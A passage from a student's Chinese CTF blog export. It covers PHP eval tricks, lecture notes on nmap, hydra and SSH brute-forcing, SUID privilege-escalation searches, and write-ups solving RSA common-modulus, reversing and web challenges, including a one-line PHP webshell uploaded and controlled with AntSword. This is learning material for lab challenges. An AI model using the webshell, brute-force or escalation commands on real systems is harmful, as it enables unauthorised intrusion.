函数返回一个布尔值，如果变量存在且不包含NULL值，则返回TRUE，否则返回FALSE。\n- eval() \n  - 代码执行函数,把输入的字符串当作 php 代码执行.  \n  - 可以 eval(?><?php [input]?>[text] <?[p])，也就是用标签声明一段 php代码结束后再声明下一段代码开始\n  - 在函数输入的结尾需要打分号,否则会报 unexpected ending\n- assert() \n  - 断言函数 assert(),在 RCE 中可以简单的认为它等同于 eval()  \n- preg_match()\n  - 如果找到一个匹配，preg_match() 函数返回 1，否则返回 0。\n- preg_replace()  \n  - 函数执行一个正则表达式的搜索和替换\n- ${}\n  - 如果出现在字符串里就会被解析,并执行其中的 php 代码\n  - ${}本是用于在字符串中嵌入变量和执行表达式的\n\n","tags":["ctf","转载","笔记"],"categories":["知识点笔记"]},{"title":"SPC新生讲座笔记","url":"/2025/10/09/讲座笔记/","content":"- python库踩坑：\n```python\npip install pycryptodome\n```\n- sq\n  - 爆破，伪加密，社工，掩码，字典\n  - pwn\n    - 看环境，找漏洞，破解\n    - **看环境，然后导入附件之后用checksec –file命令去看保护，比如你发现它没有RX保护就可以在栈上直接执行命令诸如此类**——sq\n- hackbar\n  - SQL：提供三种数据库的sql查询语句，以及一些方便联合查询的语句\n  - XSS：提供xss攻击语句\n  - string.fromcharcode()：将根据UNICODE 值来输出xss语句\n  - html charactor ： 将XSS语句转化为HTML字符实体（以&开头）\n  - alert(xss) statement : 构建一条xss测试语句，弹出一个框内容为xss，相当于alert('xss');\n  - Encryption：对所选字符进行加密，提供了MD5，SHA-1，SHA-256，ROT13等加密方式\n  - Encoding：对所选字符进行编码解码，提供了Base64 Encode,Base64 Decode,URLencode,URLdecode, HEX encoding, HEX decoding等方式\n  - Other： addslashes：在每个双引号前加反斜杠 stripslashes：除去所选字符中的反斜杠 strip space：除去所选字符中的空格 reverse：将所选字符倒序排列 usefull strings：提供了一些特殊的数值如圆周率PI,斐波那契数列等，其中buffer overflow 可以输入一定长度的字符造成缓存溢出攻击\n\n- 搭建网站\n  - service apache2 starrt\n  - python app文件夹\n  - java 哪里都有可能\n- sudo vim a.php →172..../a.php\n- python搭建 路由\n\n- 渗透\n  - y0usef可能是用户信息\n  - 前期信息收集\n  - 漏洞点-功能点里找\n    - Upload extend/base/找到位置\n  - nmap探活\n  - NAT模式-虚拟机能够在一个网段\n  - nmap -sP \n  - ipconfig\n  - 扫描端口service apache2 start\n  - 3306 33060 mycircle（？？？\n  - 无影（软件\n  - nmap -p- 192...扫描端口\n  - pin命令更快，因为window防火墙\n  - ssh远程连接\n  - 扫版本号信息\n- CVE 0day nday 1day\n          - ↑\n  - wordpress hexo模板通用漏洞\n  - apache也有\n- nmap -p加特定端口- -sVC 192.。。\n- kali自带：searchhploid apache 2.4.10\n- sudo find / -name \"...py\"→漏洞位置？？\n- cat 位置\n- Tomcat java no php?\n- ssh 用finalshell天狐渗透\n- nmap --script=ssh-brute 192...爆破\n- hydra -l ...txt noend字典爆破\n- 源代码→信息查找\n\n- dirsearch -u 地址\n- /.dockerfile 放网址后面可能直接得到答案\n- 403无权访问 302 301——状态码\n- Forbidden→无法访问状态\n\n- Burpsuite   代理抓包ctrl+R发送到REsquest  方便查看\n- Burpsuite  拓展Bypass WAF绕过403\n- B  intruder 狙击手**长度**一样-失败  trylogin失败\n\n- ？关键点复制发送绕过去？？？\n- hackbar也可以？？？\n\n- 爆破 sql注入  XXE？？\n\n- fuzz字典→搜索得到字典文件\n\n- yakit插件bypass403绕过——200成功\n- intruder-资源池\n- 账户admin root 字典-交叉 payload集：2加字典，1输入\n- CSS美化不看\n- 上传抓包B  一句话木马 上传失败 限制 找信息变化 文件头文件类型文件长度检测\n- Content-Type（限制描述\n\n- GIF89a  ??放过去\n\n- 一句话木马\n- <？php @eval>\n- 标签\n- request(同时接受request post) post cookie\n- 存储cookie\n- 中国蚁剑？？（软件\n- 右键 虚拟终端-环境变量里\n- yousef形容用户\n- 1000**提权**？？\n- Finalshell ssh连接\n\n- SSTI\n- find / -user root -perm -4000 print 2>/dev/null\n- base64 。。。txt  strings不要用\n- 无回显？？\n- awb\n\n电子取证\n- 计算机，服务器，手机1取证\n- exe,数据库，网站，区块链，物联网，流量，内存取证\n- conf后缀文件 信息重灾区 一种用于存储软件或系统配置信息的文件格式。\n- auth\n  \n电子取证\n- 方向：计算机取证，服务器取证，⼿机取证\n  - exe取证，数据库取证，⽹站取证，区块链取证，物联⽹取证，流量取证，内存取证\n- 工具\n  - vmware workstation（虚拟机运⾏），kali linux（linux环境），010editor/winhex（⼗六进制编辑器），vscode/pycharm（代码）\n- 电脑取证：xways forensics\n- 磁盘：ufs，ftk imager，efdd\n- 解密：ctool，passwarekit，hashcat，cyberchef\n- 数据库：dbbrowser，navicat\n- 内存取证：volatility\n- 流量取证：wireshark（pcapng），fiddler（saz）\n- apk取证：夜神模拟器/雷电模拟器/雷神模拟器，MT管理器，jadx-gui\n- 服务器取证：xshell/finalshell/xterminal ssh⼯具\n- exe取证：沙箱，die，ida，⽕绒\n","tags":["ctf","电子取证","笔记"],"categories":["知识点笔记"]},{"title":"扩展欧几里得算法[待]","url":"/2025/10/06/扩展欧几里得算法/","content":"\n知识递进：\n1. 同余符号：a = b % c ; b ≡ a mod c → **a % c = b % c**\n   rsa中应用：c = m ^ e % n ；m ^ e ≡ c mod n\n2. gcd(a,b)\n   基础算法：for i in range(0,min(a,b)):\n                if a % i == 0 | b % i == 0:\n                    return i\n3. 欧几里得算法又称辗转相除法，是指用于计算两个正整数a，b的最大公约数。\n   [此时mod等同于%] gcd(a,b) = gcd(b,a mod b)\n   原理：两个整数的最大公约数等于其中较小的数和两数相除余数的最大公约数。\n   算法：\n   求gcd(a,b)[假设a>b]：\n   a ÷ b = c mod d\n   b ÷ d = e mod f\n   d ÷ f = g mod h\n   if h == 0 → f = gcd(a,b)\n4. 证明：gcd(a,b) = gcd(b,a mod b) (不妨设a＞b 且r=a mod b ,r不为0)\n- 法一：公约数是最大公约数的因子，得到d = e\n\n![alt text](/img/扩展欧几里得算法_3-5.png)\n- 法二(感觉网上这个有点错误，改了下)\n  假设c = gcd(a,b),则存在m,n，使a = mc, b = nc;\n  令r = a mod b，即存在k，a = kb+r, 使r = a-kb = mc - knc = (m-kn)c;\n  故gcd(b,a mod b) = gcd(b,r) = gcd(nc,(m-kn)c) = gcd(n,m-kn)c;\n  则c为b与a mod b的公约数;\n  假设d = gcd(n,m-kn), 则存在x,y, 使n = xd, m-kn = yd; 故m = yd+kn = yd+kxd = (y+kx)d;\n  故有a = mc = (y+kx)dc, b = nc = xdc; 可得 gcd(a,b) = gcd((y+kx)dc,xdc) >= dc;\n  由于gcd(a,b) = c, 【故 c >= dc, d <= 1 ,又d = gcd(n,m-kn)，所以d >= 1, 】（自己删改的部分）综上：d = 1;\n  即gcd(n,m-kn) = 1, 故可得gcd(b,a mod b) = c;\n  故得证gcd(a,b) = gcd(b,a mod b).\n\n[原解法来源](https://baike.baidu.com/item/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/1647675)\n","tags":["ctf","crypto"],"categories":["知识点笔记"]},{"title":"SPC新生讲座题目wp","url":"/2025/10/06/SPC新生讲座题目/","content":"### 鸣谢\n- 感谢sq,xc学长和cty学姐的帮助和教导！！！\n- 除了大头像放后面做其他也是完结了，第一次wp磕磕绊绊做出来了嘻嘻\n\n### 曼波曼波曼波\n- 倒转的base，翻转脚本：\n```python\n# 读取 txt 文件并翻转内容\ndef reverse_txt_file(input_path, output_path):\n    try:\n        with open(input_path, 'r', encoding='utf-8') as file:\n            content = file.read()\n        \n        reversed_content = content[::-1]\n        \n        with open(output_path, 'w', encoding='utf-8') as file:\n            file.write(reversed_content)\n        \n        print(f\"成功！原文件: {input_path}\")\n        print(f\"反转文件: {output_path}\")\n        print(f\"原内容长度: {len(content)} 字符\")\n        print(f\"反转内容长度: {len(reversed_content)} 字符\")\n        \n    except FileNotFoundError:\n        print(f\"错误：找不到文件 {input_path}\")\n    except Exception as e:\n        print(f\"错误：{e}\")\n\ninput_file = r'E:\\app-down\\题目工作区\\mbmb\\smn.txt'\noutput_file = r'E:\\app-down\\题目工作区\\reversed_smn.txt'\n\nreverse_txt_file(input_file, output_file)\n\n```\n- AI：Base64 编码的 ZIP 文件数据，解码后就恢复成原始的 ZIP 二进制文件。\n- 使用 CyberChef（厨子）：https://gchq.github.io/CyberChef/\n    - Input (Base64字符串) \n    - Drag \"From Base64\" recipe \n    - 得到二进制数据\n    - 点击右下角下载按钮保存为 .zip 文件\n- 双图盲水印：\n  - [方法原地址](https://www.shuzhiduo.com/A/kjdwEn0wJN/)\n  - 注意：在文件下打开poweshell\n  - 存档-电脑此工具位置：E:\\app-down\\双图盲水印\\BlindWaterMark-master\\BlindWaterMark-master\n\n### ida使用.exe\n```\nWelcome to Reverse Engineering!!!\n欢迎来到逆向工程！！！\n\nPress Enter to find flag1\n按 Enter 键查找 flag1\n\nNSSCTF{\nNSSCTF{\n```\n\n```\nNext, I will teach you how to use ida.\n接下来，我将教你如何使用 IDA。\n\nThe first step is to open the exe file with ida.\n第一步是用 IDA 打开 exe 文件。\n\nF5 can convert the current interface into pseudo C code\nF5 可以将当前界面转换为伪 C 代码\n\nThe shortcut key shfit + F12 is to view strings. We can often find the entry point here.\n快捷键 Shift + F12 用于查看字符串。我们经常可以在这里找到入口点。\n\nYou can see flag2 there\n你可以在那里看到 flag2\n```\n- function页面找main文件，在“You can see flag2 there”处快捷键 Shift + F12 ，找到：IDA_1s_4_VeRy_Impo\n- 双击后页面按X连接可以看到flag2\n![alt text](/img/SPC新生讲座题目_2-11.png)\n- Tab 键进入伪C代码页面，双击函数可进入详细界面\n```\nThe tab key can switch between the assembly and disassembly interfaces, and sometimes disassembly can interfere with our analysis.\nTab 键可以在汇编和反汇编界面之间切换，有时候反汇编会干扰我们的分析。\n```\n- Tab 键进入汇编页面，观察call类型以及灰色翻译部分\n![alt text](/img/SPC新生讲座题目_2-9.png)\n```\nIn ida, shift+E can extract data in order of the size of the program\n在 IDA 中，Shift+E 可以按程序大小顺序提取数据\n\nThe R key is to convert data into character form\nR 键是将数据转换为字符形式\n\nTry to find flag3\n尝试找到 flag3\n```\n- 看mov，英文猜测important所以是倒序\n- 断店操作：Debugger-local windows debugger-运行（如果没有窗口window-reset desktop）\n- 直接双击找shift+E R 导出为string，得到：rTant_t0ol_iN_ \n![alt text](/img/SPC新生讲座题目_3-1.png)\n```\nThe left side of ida is the function, and sometimes you can find important information from the function name.\nIDA 的左侧是函数列表，有时候你可以从函数名中找到重要信息。\n\nThe patch method can achieve our goal by directly modifying the binary file\n打补丁的方法可以通过直接修改二进制文件来实现我们的目标\n\nFLAG4 NOT HRER\nFLAG4 不在这里\n```\n- flag4(void)（？汇编文件，选取函数名称搞补丁\n![alt text](/img/SPC新生讲座题目_3-2.png)\n- 通过任选printf()右键Assemble，改call后为函数名称，enter修改\n![alt text](/img/SPC新生讲座题目_3-3.png)\n- 右键Patching-apply导出，运行新程序得到：rever5e_en8ine3ring}\n![alt text](/img/SPC新生讲座题目_3-4.png)\n- 注：在 IDA 中从流程图视图切换回连续的文本/表格视图用空格键\n- 最后答案：NSSCTF{IDA_1s_4_VeRy_ImporTant_t0ol_iN_rever5e_en8ine3ring}\n\n### twoEs1\n- 题目：\n```python\nfrom Cryptodome.Util.number import *\nimport random\n\nflag=b\"SPCCTF{********}\"\n\np, q = getPrime(512), getPrime(512)\nn = p * q\n\ne1 = random.getrandbits(32)\ne2 = random.getrandbits(32)\n\nimport gmpy2\ns,s1,s2=gmpy2.gcdext(e1,e2)\nprint(s)\n#导入 gmpy2 库进行大数运算 \n#gmpy2.gcdext(a,b)计算扩展欧几里得算法 返回 (g,s,t)，其中 g=gcd(a,b)，且 s*a + t*b = g\n\nm = bytes_to_long(flag)\nc1 = pow(m, e1, n)\nc2 = pow(m, e2, n)\n\nprint(f'{n = }')\nprint(f'{e1 = }')\nprint(f'{e2 = }')\nprint(f'{c1 = }')\nprint(f'{c2 = }')\n\n'''\nn = 77653027019410283582708662091841984922043011758121679079881183020813164663803315218162399044305258074482737579924642303624296916990420038267507847806411365847770079739424288020008734096352715536212355610499244337263033620679172659903396470522388964976403280440005666750783772493205491694203801534799771603973\ne1 = 1550550838\ne2 = 4196113069\nc1 = 10879882027555312937608696756143487708492509877667613620249639748606727334006539946052668627697088875994270713711095280209616987454727654075073679556671706894288288425066016765935927179268631914629763649753266424293357163466575462028472324055698901991171526421270840161635556574472647431065514324250656887711\nc2 = 3011958986718808526365150648555525977083765700624932707761381505508399298854491454270664897732491521128964864382168158216240628717617068568110917894811504799962807736416471284350198523924590448858301736435406723758509936349838419125901147351088181623044341056413457153562300106346324761118425649126782967195\n'''\n```\n- 解决方案(基于gcd = 1以及n相同加密)\n```python\nimport gmpy2\nfrom Cryptodome.Util.number import long_to_bytes\n\nn = 77653027019410283582708662091841984922043011758121679079881183020813164663803315218162399044305258074482737579924642303624296916990420038267507847806411365847770079739424288020008734096352715536212355610499244337263033620679172659903396470522388964976403280440005666750783772493205491694203801534799771603973\ne1 = 1550550838\ne2 = 4196113069\nc1 = 10879882027555312937608696756143487708492509877667613620249639748606727334006539946052668627697088875994270713711095280209616987454727654075073679556671706894288288425066016765935927179268631914629763649753266424293357163466575462028472324055698901991171526421270840161635556574472647431065514324250656887711\nc2 = 3011958986718808526365150648555525977083765700624932707761381505508399298854491454270664897732491521128964864382168158216240628717617068568110917894811504799962807736416471284350198523924590448858301736435406723758509936349838419125901147351088181623044341056413457153562300106346324761118425649126782967195\n\n# 检查是否互质\ngcd, u, v = gmpy2.gcdext(e1, e2)\nprint(f\"gcd(e1,e2) = {gcd}\")  # 应该是 1\n# u × e1 + v × e2 = gcd(e1, e2)\n\nif gcd == 1:\n    # 计算明文\n    if u < 0:\n        c1 = gmpy2.invert(c1, n)\n        u = -u\n    if v < 0:\n        c2 = gmpy2.invert(c2, n) \n        v = -v\n    m = (pow(c1, u, n) * pow(c2, v, n)) % n\n    flag = long_to_bytes(m)\n    print(flag.decode())\n```\n\n- 共模攻击：[ pow(a, b, n) → n为模数 ]（详见RSA）\n  - 攻击原理：\n    如果 gcd(e1, e2) = 1，可以通过扩展欧几里得算法找到 u, v 使得：\n    u × e1 + v × e2 = 1\n    c1^u × c2^v ≡ m^(u×e1) × m^(v×e2) ≡ m^(u×e1 + v×e2) ≡ m^1 ≡ m (mod n)\n  - 根本原因：RSA 的安全性依赖于大数分解困难性，但当使用相同模数加密相同消息时，攻击者可以利用代数关系绕过分解问题。\n\n### twoEs2\n- 题目：\n```python\nfrom Cryptodome.Util.number import *\nimport random\n\nflag=b\"SPCCTF{********}\"\n\np, q = getPrime(512), getPrime(512)\nn = p * q\n\ne1 = random.getrandbits(32)\ne2 = random.getrandbits(32)\n\nm = bytes_to_long(flag)\nc1 = pow(m, e1, n)\nc2 = pow(m, e2, n)\n\nprint(f'{n = }')\nprint(f'{e1 = }')\nprint(f'{e2 = }')\nprint(f'{c1 = }')\nprint(f'{c2 = }')\n\n'''\nn = 97600241525101615748091592571664660926639880623676630098513390980179339048294452878617774530804846547759693682625720452045482941031433063601264167464483345140203593650062234011147495096867025786848883396312986373098722431552517575960894385653813275110519118159478403718867113163144951756435064109978693850991\ne1 = 3739335288\ne2 = 3124897683\nc1 = 33002001040793361121205743705051566694083960204437803400110996553874970546459769940895274538944142911035661180721041433582055055901827086366079458238180515982882281159369335115689197909674012289803866694817803339799332165760217770985620911446230237865457225365735286754884597360255964535103536362788889343153\nc2 = 28612632923221914052449458260170537094022260373135401108346955487860713981145320349945832078855063911329616383875004373295934310132767249858424266864981319085969453037587482565982836138763906635775429377847559657878241052164215585546465219419202751784070881845017799754069244601020027997406547478196338470880\n'''\n```\n- 解法：\n```python\nfrom Cryptodome.Util.number import *\nimport random\nimport gmpy2\n#from Crypto.Util.number import *\nfrom gmpy2 import *\n\nn = 97600241525101615748091592571664660926639880623676630098513390980179339048294452878617774530804846547759693682625720452045482941031433063601264167464483345140203593650062234011147495096867025786848883396312986373098722431552517575960894385653813275110519118159478403718867113163144951756435064109978693850991\ne1 = 3739335288\ne2 = 3124897683\nc1 = 33002001040793361121205743705051566694083960204437803400110996553874970546459769940895274538944142911035661180721041433582055055901827086366079458238180515982882281159369335115689197909674012289803866694817803339799332165760217770985620911446230237865457225365735286754884597360255964535103536362788889343153\nc2 = 28612632923221914052449458260170537094022260373135401108346955487860713981145320349945832078855063911329616383875004373295934310132767249858424266864981319085969453037587482565982836138763906635775429377847559657878241052164215585546465219419202751784070881845017799754069244601020027997406547478196338470880\n\ns,s1,s2=gmpy2.gcdext(e1,e2)\nprint('s = ',s)\n\nm = pow(c1, s1, n)*pow(c2, s2, n) % n  # 最后别忘记再模上一个n，整体都在模n中\n#flag = long_to_bytes(m).decode()\nprint(long_to_bytes(iroot(m, 3)[0]))\n#print(flag) \n```\n- [参考](https://saga131.github.io/2024/09/17/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/)；[未看](https://www.cnblogs.com/SevensNight/p/18766177)\n\n### 签个到吧！\n- 题目：\n```brainfuck\nn```\n- 试图解释：\n  - 快速笔记：“.”为指针位置\n  - \\>+++++++++++++++++[<++++++>-+-+-+-]<[-]>++++++++++++[<+++++++++>-+-+-+-]\n    - \\>+17 ; [<+6>-1] ; ; >+12 ; [<+9>-] ;\n    - 0 17. ; 17*6 = 102 0. ; 0. 0 ; 0 12. ; 9*12 = 108 0. ;\n    - 102 0. → 108 0.\n  - <[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]\n    - < ; >+97 ; [<+>-]\n    - 108\\. 0 ; 108 97. ; 108 + 97 = 205 0.\n- 大概理解了，开造\n```python\ndef brainfuck(a):\n    li = [0]\n    index = 0\n    kuo = []\n    output = []\n    i = 0\n    while i < len(a):\n        if a[i] == '+' or a[i] == '-':\n            li[index] = eval(str(li[index]) + a[i] + '1')\n        elif a[i] == '>':\n            index += 1\n            if len(li) <= index:\n                li.append(0)\n        elif a[i] == '<':\n            index -= 1\n        elif a[i] == '.':\n            print(li[index], end=' ')\n            output.append(li[index])\n        elif a[i] == ',':\n            i += 1\n            li[index] = ord(a[i])\n        elif a[i] == '[':\n            if li[index] == 0:\n                while a[i] != ']':\n                    i += 1\n                i += 1\n            else:\n                kuo.append(i)\n        elif a[i] == ']':\n            if li[index] != 0:\n                i = kuo.pop()-1\n            else:\n                temp = kuo.pop()\n        i += 1\n    return output\n\na = '''\nn'''\na = a.replace('[-]', '.[-]')\noutput = brainfuck(a)\nfor i in output:\n    print(chr(i), end='')\n```\n- 解释：就是指针内容没有用.输出，所以在[-]删除前加输出从而得到结果\n- 教训：人要好好学习不要偷懒用AI哈哈哈讲的差不多理解就是完全没理解\n\n### xor\n#### 第一步\n![alt text](/img/SPC新生讲座题目_4-1.png)\n- 循环28次（i从0到27）说明flag长度为28个字符\n- 验证条件\n  - v4[i]：用户输入的第i个字符\n  - (unsigned __int8)：将字符转换为无符号8位整数（0-255）\n  - ^ 0x7A：与十六进制0x7A（十进制122）进行异或运算\n  - enc_0[i]：预设的正确加密值的第i个元素\n  - !=：比较是否不相等\n#### 第二步\n![alt text](/img/SPC新生讲座题目_4-2.png)\n- db：Define Byte 表示定义字节数据\n- 有 h 后缀：明确表示十六进制\n- n dup (a)：表示n个a\n#### 解密代码\n```python\nenc_0 = [\n    0x34, 0x29, 0x29, 0x39, 0x2E, 0x3C, 0x01, 0x22, 0x15, 0x08, 0x25,\n    0x13, 0x09, 0x25, 0x18, 0x1B, 0x09, 0x13, 0x19, 0x25, 0x08, 0x1F, 0x0C,\n    0x1F, 0x08, 0x09, 0x1F, 0x07\n]\n\ndef decrypt_flag(enc_data):\n    flag = ''\n    for encrypted in enc_data:\n        # 异或解密：encrypted ^ 0x7A\n        original_char = encrypted ^ 0x7A\n        flag += chr(original_char)\n    return flag\n\n# 解密\nflag = decrypt_flag(enc_0)\nprint(\"解密后的flag:\", flag)\n```\n### 这羽毛球怎么只有一半啊（恼）\n- crc高度题 010editor打开下方有报错信息，记得拉上来看！\n- 代码\n```python\nimport binascii\nimport struct\n \n \n \ncrcbp = open(\"./羽毛球.png\", \"rb\").read()    #打开图片\ncrc32frombp = int(crcbp[29:33].hex(),16)     #读取图片中的CRC校验值\nprint(crc32frombp)\n \nfor i in range(4000):                        #宽度1-4000进行枚举\n    for j in range(4000):                    #高度1-4000进行枚举\n        data = crcbp[12:16] + \\\n            struct.pack('>i', i)+struct.pack('>i', j)+crcbp[24:29]\n        crc32 = binascii.crc32(data) & 0xffffffff\n        #print(crc32)\n        if(crc32 == crc32frombp):            #计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定\n            print(i, j)\n            print('hex:', hex(i), hex(j))\n            exit(0)\n```\n#### 【待】\n- 修改高度（额看了wp改的怎么找）bushi没法理解为什么修改这里\n![alt text](/img/SPC新生讲座题目_4-3.png)\n\n### 掩码爆破\n- 如题，简单\n\n### F12?\n- 当个别网页禁用F12，无法查看网页源代码时，可以通过地址栏操作后使用F12：\n- 打开目标网页后，不要直接按F12，而是先用鼠标点击浏览器地址栏，全选当前网址。在全选网址的状态下，按下F12键。此时，部分网页可能会因为这一操作而解除对F12的禁用，从而允许你打开开发者工具查看源代码。\n\n### F12\n- 极其简单，如题\n  \n### test\n- 极其简单，如题\n\n### word-03\n- 伪加密[参考](https://blog.csdn.net/xiaozhaidada/article/details/124538768)\n  - 特征：\n    - 压缩源文件数据区的全局方式位标记应当为 00 00  （50 4B 03 04 14 00 后）\n    - 且压缩源文件目录区的全局方式位标记应当为 09 00   （50 4B 01 02 14 00 后）\n  - 修改方法：\n    - 确定是伪加密后就需要将其修改为无加密，方法很简单，就是将压缩源文件目录区的全局方式位标记从09 00改为00 00。\n- 将这个word文件重命名为zip后，发现还能继续解压\n- 找到flag\n- 反思：搜索时注意是搜索文本还是十六进制，好愚蠢的问题已经第二次犯了|-_-··|\n\n### Basic Number theory\n- 同余基本性质\n  - ‌反身性‌：a ≡ a (mod m)，任何整数与其自身同余。\n  - ‌对称性‌：若a ≡ b (mod m)，则b ≡ a (mod m)，同余关系可逆。‌\n  - ‌传递性‌：若a ≡ b (mod m)且b ≡ c (mod m)，则a ≡ c (mod m)，允许链式推导。\n  - ‌运算性质‌：\n    - 加减性：若a ≡ b (mod m)且c ≡ d (mod m)，则a±c ≡ b±d (mod m)。‌\n    - 乘性：若a ≡ b (mod m)且c ≡ d (mod m)，则ac ≡ bd (mod m)，推广至幂次有aⁿ ≡ bⁿ (mod m)。‌\n    - 消去律‌：若ca ≡ cb (mod m)且(c,m)=1（c与m互质），则a ≡ b (mod m)。‌‌\n- 解决代码+详细计算过程\n```python\np = 105567001902149483225233801278030547652749833525571608392930512645364400245999\nq = 81511997683966846473333390828680375856568631631277717336250575831122994340471\ngift1 = 105419799642658114984760815640014033297217363704585842609128111376906603236722\ngift2 = 81364795424475478232860405190663861501036161810291951552448174562665197331194\n#根据模运算的基本性质：如果 a ≡ b (mod n)，那么 a² ≡ b² (mod n)\nfrom Cryptodome.Util.number import *\nprint(gift1 == pow(gift1,1,p))\n# >>> True\n# 所以gift1² ≡ m^(q+1) (mod q)\n# 继续用费马小定理：\n# gift1² ≡ m^(q+1) (mod q)\n#        ≡ m^q × m (mod q)\n# 根据费马小定理：m^q ≡ m (mod q)（当 q 是素数时）\n# gift1² ≡ m × m (mod q) ≡ m² (mod q)\n# 实际上我们有：gift1^2 ≡ m^2 mod q ; gift2^2 ≡ m^2 mod p\n# 这意味着：gift1^2 - m^2 ≡ 0 mod q  => q | (gift1^2 - m^2)\n#          gift2^2 - m^2 ≡ 0 mod p  => p | (gift2^2 - m^2)\n# 所以(gift1 - m)(gift1 + m) ≡ 0 mod q\n#     (gift2 - m)(gift2 + m) ≡ 0 mod p\n# 关键数学原理：在模素数的情况下，如果 a × b ≡ 0 mod p（其中 p 是素数），那么：\n# 要么 a ≡ 0 mod p\n# 要么 b ≡ 0 mod p\n# 这是因为素数的一个重要性质：模素数的环是整环，没有零因子。\n# 因此 m ≡ ±gift1 mod q ; m ≡ ±gift2 mod p\nimport math\nprint(math.gcd(p,q))\n# >>> 1\n# https://oi-wiki.org/math/number-theory/crt/#%E8%BF%87%E7%A8%8B\n\nfrom sympy.ntheory.modular import crt\n\na = [-gift1,-gift2]\nr = [p,q]\n\nm = crt(r, a)[0]\nflag = long_to_bytes(m)\nprint(flag.decode())\n```\n### basic-RSA\n- 在RAS笔记里学长给做过，考察inverse()函数的应用\n\n### hackbar\n- hackbar浏览器插件使用方法：先LOAD后Use POST method加载网页\n![alt text](/img/SPC新生讲座题目_5-1.png)\n- 直接URL后面添加，插件里添加后按EXECUTE执行\n![alt text](/img/SPC新生讲座题目_5-2.png)\n![alt text](/img/SPC新生讲座题目_5-3.png)\n- 讲座后复刻，好像和学姐教的不一样？（但成功了~~后面问下\n- 愚蠢，只需要下面部分，<?php>\n![alt text](/img/SPC新生讲座题目_5-4.png)\n- 第三关：浏览器身份挑战-要求：我要battlefield_six浏览器\n- 直接更改User-Agent\n![alt text](/img/SPC新生讲座题目_5-5.png)\n- 要求：我要本地访问\n- 解法：如图\n\n### super_baby_eval\n- 网页\n```php\n<?php\nif(isset($_GET['eval']) && $_GET['eval'] === 'gogogo'){\n    echo \"666\";\n    if(isset($_POST['evalpost'])){\n        eval($_POST['evalpost']);\n    }\n} else {\n    show_source(__FILE__);\n}\n?>\n```\n![alt text](/img/SPC新生讲座题目_5-6.png)\n![alt text](/img/SPC新生讲座题目_5-7.png)\n- 查看详细文件信息\n![alt text](/img/SPC新生讲座题目_5-8.png)\n- 硬搜flag获得\n![alt text](/img/SPC新生讲座题目_5-9.png)\n![alt text](/img/SPC新生讲座题目_5-10.png)\n\n### baby_upload\n- 上传php文件\n```php\n<?php\n@eval($_POST['shell']);\n?>\n```\n- 打开Burpsuite代理，记录端口信息\n![alt text](/img/SPC新生讲座题目_5-11.png)\n- 打开中国蚁剑，右键添加数据，密码为php文件变量名\n![alt text](/img/SPC新生讲座题目_5-12.png)\n- 双击数据进入网站文件，根目录寻找flag\n- 成功！\n- [参考](https://www.yuque.com/antswordproject/antsword/uvmwzn)\n\n### baby_eval\n- hackbar body处输入code=/???/?a??64 /??a?\n- 怀疑是/bin因为/?a?没反应应该不是cat\n- base64解码\n\n### super_baby_include\n- 简单\n![alt text](/img/SPC新生讲座题目_5-13.png)\n\n### robots\n- 在HackBar的URL输入：http://靶机地址/robots.txt\n- 选择GET方法（不是POST）!!!\n- 得到/f1agggggggg.txt\n- 输入URL得到flag[](flag{You_1InD_ROB0T5!!!_20576b704467})\n\n### 爆破\n- Burpsuite也可以，但注意光标偏移问题payload位置以添加完毕显示为准，而且有自动添加payload功能只是删除多余payload也要注意偏移问题！！！\n- yakit成功[参考](https://blog.csdn.net/miraclehw/article/details/134138197)\n![alt text](/img/SPC新生讲座题目_5-14.png)\n- 没找到本地文件导入，但有临时文件导入按行读取功能一样成功，( •̀ ω •́ )耶\n\n","tags":["ctf","wp","共模攻击","spc"],"categories":["wp"]},{"title":"第三届长安杯笔记","url":"/2025/10/01/第三届长安杯笔记/","content":"### 鸣谢\n- 感谢sq学长和cty学姐的帮助和教导！！！\n- 第一个大型比赛复刻学习结束了，好累(｡し_し｡)但是继续出发(≧▽≦)哈哈哈\n\n### 2021年4月25日，上午8点左右，警方接到被害人金某报案，声称自己被敲诈数万元；经询问，昨日金某被嫌疑人诱导裸聊，下载了某“裸聊”软件，导致自己的通讯录和裸聊视频被嫌疑人获取，对其进行敲诈，最终金某不堪重负，选择了报警；警方从金某提供的本人手机中，定向采集到了该“裸聊”软件的安装包--zhibo.apk（检材一），请各位回答下列问题：（题目中需要通过分析出来的答案对检材二三四五解压，解压密码为IP的情况，需要在密码后增加-CAB2021，例：192.168.100.100-CAB2021）\n#### 1. 请计算检材一Apk的SHA256值：\n1）直接将apk拖入hashcal计算\n2）雷电APP智能分析直接出，但注意SHA256的主体是检材\n\n![alt text](/img/第三届长安杯笔记_2-1.png)\n3）window自带工具：certutil -hashfile 检材一-zhibo.apk sha256\n\n\n#### 2. 该APK的应用包名为\n1）使用jadx反编译，查看AndroidManifest.xml，package的值就是包名\n2）雷电APP智能分析直接出\n\n![alt text](/img/第三届长安杯笔记_2-2.png)\n#### 3. 该APK程序在封装服务商的应用唯一标识（APPID）为\n- 使用jadx反编译，可以在assets的apps目录下找到，文件夹名字就是\n- xml文件第一行后面也有 package=\"plus.H5B8E45D3\" ，应用包名后半部分与APPID一致（？不确定\n\n![alt text](/img/第三届长安杯笔记_2-5.png)\n——[来源](https://www.cnblogs.com/WXjzc/p/16113357.html)\n\n![alt text](/img/第三届长安杯笔记_2-6.png)\n\n**查证：**\n1. “应用ID必须至少包含两段（一个或多个圆点）。每段必须以字母开头，所有字符必须为字母数字或下划线 [a-zA-Z0-9_]。例如，com.example.myapp 是一个有效的应用ID。”——[来源](https://www.oryoy.com/news/yi-zhao-jiao-ni-qing-song-huo-qu-android-ying-yong-de-wei-yi-biao-shi-appid-a13839322.html)\n**应该是写错了这个讲的是应用包名**\n1. 问deepseek\n<!-- 让表格居中显示的风格 -->\n<style>\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n</style>\n<div class=\"center\">\n\n| 维度 | APK 包名 | 服务商 APPID |\n| :--- | :--- | :--- |\n| **定义与归属** | 技术身份：在代码中定义，是应用在安卓系统中的唯一技术标识。 | 商业身份：由应用商店或服务商（如华为、腾讯、阿里）分配，是其在平台生态内的唯一商业标识。 |\n| **设定者** | 开发者。 | 